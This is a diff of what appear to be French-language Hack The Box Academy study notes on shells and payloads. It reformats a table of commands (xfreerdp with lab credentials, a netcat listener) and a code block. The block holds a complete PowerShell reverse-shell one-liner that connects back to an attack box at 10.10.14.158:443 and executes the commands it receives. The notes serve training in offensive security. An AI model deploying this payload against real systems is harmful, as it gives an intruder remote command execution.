@@ -8,8 +8,9 @@
 -   `Programming`: La partie de données référencée ou transportée par l'instruction du langage de programmation.
 -   `Exploitation & Security`: Une charge utile est `code`conçue dans le but d'exploiter une vulnérabilité sur un système informatique. Le terme charge utile peut décrire divers types de logiciels malveillants, y compris, mais sans s'y limiter, les rançongiciels.
 
+
 | **Commands**                                                                                        | **Description**                                                                                                                                                                                         |
-| --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| :--------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`                                       | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol                                                                                                                    |
 | `env`                                                                                               | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use                             |
 | `sudo nc -lvnp <port #>`                                                                            | Starts a `netcat` listener on a specified port                                                                                                                                                          |
@@ -44,4 +45,7 @@
 
 Powershellone-liner utilisé pour se reconnecter à un écouteur qui a été démarré sur une boîte d'attaque:
 
-`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(`**'10.10.14.158',443**`);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(( $i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(( $i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```  
+
